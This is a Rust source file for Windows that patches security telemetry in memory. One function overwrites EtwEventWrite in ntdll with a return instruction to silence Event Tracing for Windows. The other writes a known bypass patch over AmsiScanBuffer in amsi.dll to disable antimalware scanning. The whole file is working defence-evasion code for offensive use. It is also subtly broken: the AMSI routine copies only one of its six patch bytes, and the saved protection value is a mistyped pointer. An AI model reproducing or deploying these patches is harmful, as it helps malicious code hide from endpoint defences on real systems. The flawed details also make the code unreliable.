use core::ffi::c_void;
use windows::core::PCSTR;
use crate::error::AppError;
use windows::Win32::Foundation::HINSTANCE;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::VirtualProtect;
use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;

pub fn patch_etw()->Result<(), AppError> {
    // Get Event Consumer from: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
    // Note: add the following line to the Consumer code: 
    // #pragma comment (lib, "advapi32")

    // Get handle to ntdll
    let lplibfilename: PCSTR = PCSTR(b"ntdll.dll\0"[..].as_ptr() as *const u8);
    let hmodule: HINSTANCE = unsafe {
        match LoadLibraryA(lplibfilename) {
            Ok(val) => {
                if val.0 == 0 as isize {
                    return Err(AppError{description: String::from("LoadLibraryA() returned an invalid handle")});    
                }
                val
            },
            Err(_e) => {
                let err_msg = format!("LoadLibraryA() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };

    // Get Address of EtwEventWrite()
    let lpprocname: PCSTR = PCSTR(b"EtwEventWrite\0"[..].as_ptr() as *const u8);
    let proc_address = unsafe {
        match GetProcAddress(hmodule, lpprocname) {
            Some(val) => val,
            None => {
                let err_msg = format!("GetProcAddress() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };
    
    // Change Memory Permissions to enable writing one byte of data
    let oldprotect = 0; 
    let addr_oldprotect: *const u8 = &oldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            1 as usize,
            PAGE_EXECUTE_READWRITE,
            addr_oldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    let ret_code: &[u8] = &[195];
    // Copy ret code 
    unsafe {
        let dst_ptr = proc_address as *mut u8;
        let src_ptr = ret_code.as_ptr() as *const u8;
        std::ptr::copy_nonoverlapping(src_ptr, dst_ptr, 1);
    }

    // Change back the permissions of the memory region
    let oldoldprotect = 0;
    let addr_oldoldprotect: *const u8 = &oldoldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            1 as usize,
            PAGE_PROTECTION_FLAGS(oldprotect.into()),
            addr_oldoldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    Ok(())
}

pub fn patch_amsi()->Result<(), AppError> {
    // Rasta-Mouse's patch: https://rastamouse.me/memory-patching-amsi-bypass/
    let bytes_to_write: &[u8] = &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]; 
    
    // Get handle to ntdll
    let lplibfilename: PCSTR = PCSTR(b"amsi.dll\0"[..].as_ptr() as *const u8);
    let hmodule: HINSTANCE = unsafe {
        match LoadLibraryA(lplibfilename) {
            Ok(val) => {
                if val.0 == 0 as isize {
                    return Err(AppError{description: String::from("LoadLibraryA() returned an invalid handle")});    
                }
                val
            },
            Err(_e) => {
                let err_msg = format!("LoadLibraryA() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };

    // Get Address of EtwEventWrite()
    let lpprocname: PCSTR = PCSTR(b"AmsiScanBuffer\0"[..].as_ptr() as *const u8);
    let proc_address = unsafe {
        match GetProcAddress(hmodule, lpprocname) {
            Some(val) => val,
            None => {
                let err_msg = format!("GetProcAddress() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };
    
    // Change Memory Permissions to enable writing one byte of data
    let oldprotect = 0; 
    let addr_oldprotect: *const u8 = &oldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            6 as usize,
            PAGE_EXECUTE_READWRITE,
            addr_oldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    // Copy ret code 
    unsafe {
        let dst_ptr = proc_address as *mut u8;
        let src_ptr = bytes_to_write.as_ptr() as *const u8;
        std::ptr::copy_nonoverlapping(src_ptr, dst_ptr, 1);
    }

    // Change back the permissions of the memory region
    let oldoldprotect = 0;
    let addr_oldoldprotect: *const u8 = &oldoldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            6 as usize,
            PAGE_PROTECTION_FLAGS(oldprotect.into()),
            addr_oldoldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    Ok(())
}